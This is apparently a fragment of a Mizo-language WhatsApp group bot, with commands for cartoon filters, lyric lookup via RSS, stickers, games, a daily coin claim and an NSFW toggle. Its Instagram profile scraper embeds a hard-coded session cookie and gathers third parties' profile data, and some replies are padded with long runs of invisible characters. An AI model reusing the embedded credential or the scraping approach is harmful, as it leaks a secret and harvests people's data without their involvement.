async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}
async function Cartoon(url) {
	return new Promise(async (resolve, reject) => {
		let Data;
		try {
			let buffer = await GetBuffer(url);
			let Base64 = await GetType(buffer);
			await axios
				.request({
					url: "https://access1.imglarger.com/PhoAi/Upload",
					method: "POST",
					headers: {
						connection: "keep-alive",
						accept: "application/json, text/plain, */*",
						"content-type": "application/json",
					},
					data: JSON.stringify({
						type: 11,
						base64Image: Base64.result,
					}),
				})
				.then(async ({ data }) => {
					let code = data.data.code;
					let type = data.data.type;
					while (true) {
						let LopAxios = await axios.request({
							url: "https://access1.imglarger.com/PhoAi/CheckStatus",
							method: "POST",
							headers: {
								connection: "keep-alive",
								accept: "application/json, text/plain, */*",
								"content-type": "application/json",
							},
							data: JSON.stringify({
								code: code,
								isMember: 0,
								type: type,
							}),
						});
						let status = LopAxios.data.data.status;
						if (status == "success") {
							Data = {
								message: "success",
								download: {
									full: LopAxios.data.data.downloadUrls[0],
									head: LopAxios.data.data.downloadUrls[1],
								},
							};
							break;
						} else if (status == "noface") {
							Data = {
								message: "noface",
							};
							break;
						}
					}
				});
		} catch (_error) {
			Data = false;
		} finally {
			if (Data == false) {
				reject(false);
			}
			resolve(Data);
		}
	});
}
function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    m.reply(`This feature is for premium user, contact the owner to become premium user`)
}

        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await HBWABotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await HBWABotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
HBWABotInc.sendMessage(from, { caption: "\n*©HBWABot*", image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, emoji dang rawn dah rawh\nNOTE : Emoji pakhat chauh aw")
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: HBWABotInc.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, HBWABotInc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
HBWABotInc.ev.emit('messages.upsert', msg)
}

switch (command) {
case 'owner': {
const mawla = await HBWABotInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
HBWABotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Hei aw ka owner hmelthapa chu😇`, mentions: [sender]}, { quoted: mawla })
}
break
case 'hi': case 'hii': case 'hiii': case 'helo': case 'hello': case 'hlo': case 'sir': case 'kapu': case 'hy': case 'hey': { 
if (m.isGroup) return await HBWABotInc.sendMessage(from, { react: { text: "👋️" , key: m.key }})
const herbert = await HBWABotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Kei hi bot ka ni-a zawh duh i nei chuan owner hi va zawt rawh`, mentions: [sender]}, { quoted: m })
HBWABotInc.sendMessage(from, { contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: herbert })
}
break
case 'autoread':
                if (!HerbertTheCreator) return replyherbertstyle(mess.owner)
                if (args.length < 1) return replyherbertstyle(`I option duh thlang rawh, i tih dan tur chu\n${prefix + command} on/off\n\non chuan a activate ang\n off chuan deactivate na`)
                if (q === 'on') {
                    autoread = true
                    replyherbertstyle(`Message autoread a dah a ni✓`)
                } else if (q === 'off') {
                    autoread = false
                    replyherbertstyle(`Message autoread chu off a ni✓`)
                }
                break
case 'autostview':
                if (!HerbertTheCreator) return replyherbertstyle(mess.owner)
                if (args.length < 1) return replyherbertstyle(`I option duh thlang rawh, i tih dan tur chu\n${prefix + command} on/off\n\non chuan a activate ang\n off chuan deactivate na`)
                if (q === 'on') {
                    autoread_status = true
                    replyherbertstyle(`Status/Stories auto view a dah a ni✓`)
                } else if (q === 'off') {
                    autoread_status = false
                    replyherbertstyle(`Status/Stories auto view chu off a ni✓`)
                }
                break 

case 'hbwabot': case '/bot': { 
        let audiobuffy = fs.readFileSync(`./HBMedia/audio/Herbert.mp3`)
HBWABotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })  
}
break 
case 'nsfw': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !HerbertTheCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfw) return replyherbertstyle('Activate a ti tawh...')
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replyherbertstyle('He group-ah hia nsfw chu hman thei a ni tawh e ')
var groupe = await HBWABotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
HBWABotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature chu he group-ah hian hman thei a ni ta, chumi awmzia chu bot hian he group-ah hian sexual graphic lam a rawn thawn thei dawn tihna!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replyherbertstyle('Deactivate a ni tawh')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replyherbertstyle('Nsfw chu he group-ah hian hman thei a ni tawh lo')
} else {
  await replyherbertstyle(`Option ang hian tih tur\n\nEntirnan: ${prefix + command} on\nEntirnan: ${prefix + command} off\n\non chu enable-na\noff chu disable-na`)
  }
  }
  break
  case 'zohlathu': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !HerbertTheCreator) return m.reply(mess.admin)
if (args[0] === "on"){
if (!isRssFeedEnabled) return replyherbertstyle('Activate a ti tawh...')
ntrssfeed.push(from)
fs.writeFileSync('./database/rssfeed.json', JSON.stringify(ntrssfeed))
replyherbertstyle('He group hi Zo Hla Thu update post thei turin activate a ni')
var groupe = await HBWABotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
} else if (args[0] === "off") {
if (!isRssFeedEnabled) return replyherbertstyle('Deactivate a ni tawh')
let off = ntrssfeed.indexOf(from)
ntrssfeed.splice(off, 1)
fs.writeFileSync('./database/rssfeed.json', JSON.stringify(ntrssfeed))
replyherbertstyle('*Zo Hla Thu* update hi he group nen hian activate a nih leh hma chuan post a ni tawh lovang')
} else {
  await replyherbertstyle(`*Option ka rawn dah hi i duh zawk zawk hmang rawh👇*\n\n*1. ${prefix + command} on*\n2. *${prefix + command} off*\n\n_*Note :*_ *~I on chuan Activate a ni anga i off chuan deactivate a ni ang~*`)
  }
  }
  break
//game
case 'suitpvp':case 'rps': case 'rockpaperscissors': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replyherbertstyle(`Game i zo chiah`)
	    if (m.mentionedJid[0] === m.sender) return replyherbertstyle(`Mi malin a khel thei loh !`)
            if (!m.mentionedJid[0]) return replyherbertstyle(`_Tunge i challange ang?_\nI challenge duh chu tag rawh..\n\nTiang hian : ${prefix}rps @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replyherbertstyle(`I challenge pui mek hian mi dang nen an la ti mek a chu vangin lo nghak rawh`)
            let id = 'suit_' + new Date() * 1
            let caption = `_*RPS PvP*_

@${m.sender.split`@`[0]}'n *RPS* khel turin @${m.mentionedJid[0].split`@`[0]} a challenge che

*Hi* @${m.mentionedJid[0].split`@`[0]} *I accept duh chuan 70 second ral hmain accept tih type la i duh loh chuan reject tih type rawh*`
            this.suit[id] = {
            chat: await HBWABotInc.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) HBWABotInc.sendText(m.chat, `_70 seconds a zo, hun a tawp_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break 
            case 'lyrics': {
if (!text) return replyherbertstyle(`Eng lyrics nge i zawn dawn?\nTiang hian hman tur: ${prefix}lyrics Thunder`)
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
replyherbertstyle(`
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim())
}
break
case 'mlyrics': {
  if (!q) return replyherbertstyle(`Eng lyrics nge i zawn dawn?\nTiang hian hman tur: ${prefix}Mlyrics Zorema Khiangte Saltang tawngtaina\n͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏\n*Hriattur :* A hla thupui leh a satu hming rawn dah tel ang che, a hla thupui hming i hre lo a nih chuan a chang i hriat lai rawn dah ang che, ziah dan dikin`) 
  var fourbrother = await getBuffer(`https://i.imgur.com/tb7TQAh.jpg`)
  HBWABotInc.sendMessage(from, { react: { text: "☢️" , key: m.key }}) 
const Parser = require('rss-parser')
const { htmlToText } = require('html-to-text')
const parser = new Parser()
const mizoly = args.join(" ")
const rssFeedURL = `https://www.mizolyric.com/feeds/posts/default?q=${mizoly}`
  try {
    const feed = await parser.parseURL(rssFeedURL)
    if (feed.items.length === 0) {
        return HBWABotInc.sendMessage(from, { text : `I lyrics duh *${text}* tih hi ka zawng hmu zo lo. A spelling i ti dik lo a ni maithei.🔍..͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏Emaw He site ah hian i zawn ang chu a awm lo pawh a ni thei https://www.mizolyric.com/ `}, { quoted: m})
    }
    let firstResultSent = false
    feed.items.forEach(async (item) => {
    if (firstResultSent) return
      console.log('Title: ' + item.title)
      console.log('Link: ' + item.link)
      console.log('Published Date: ' + item.pubDate)
      const plainTextContent = htmlToText(item.content)
      console.log('Content: ')
      console.log(plainTextContent)
      console.log('\n')
  await HBWABotInc.sendMessage(m.chat, { text: `͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏${plainTextContent}`, contextInfo:{"externalAdReply": {"showAdAttribution": true, "containsAutoReply": true, "title": `${item.title}`,"body": `Mizo Lyrics`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fourbrother,"sourceUrl": `${item.link}`}}}, { quoted: m})
    })
  } catch (error) {
    console.error('Feed laknaah eroor a awm:', error)
  }
}
break

            case 'dawntur': case'claim': case 'daily': {
      if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
          HBWABotInc.sendMessage(from, { react: { text: "💰" , key: m.key }})  
            let user = m.sender
      const cara = "cara"
      const daily  = await eco.daily(user, cara, 999); //give 999 for daily, can be changed
      
              if (daily.cd) return replyherbertstyle(`I claim tawh, ${daily.cdL} a ral hunah i claim leh thei chauh ang`); //cdL is already formatted cooldown Left
      
                replyherbertstyle(`Vawiin a tan ₹${daily.amount} i claim e, darkar 24 ral hunah i claim leh thei ang!!!`);        
    }
    break
case 'mzly': case 'hlaly': {
